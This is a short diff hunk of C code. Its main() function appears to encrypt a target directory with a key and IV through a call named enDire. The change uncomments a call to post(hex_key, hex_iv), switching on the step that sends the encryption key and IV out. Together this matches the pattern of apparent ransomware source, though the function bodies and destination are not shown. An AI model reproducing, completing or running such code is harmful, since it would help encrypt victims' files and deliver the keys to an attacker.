@@ -161,7 +161,7 @@ int main()
 
     printf("%s", target_directory);
     enDire(target_directory, key, iv);
-    // post(hex_key, hex_iv);
+    post(hex_key, hex_iv);
 
     return 0;
 }
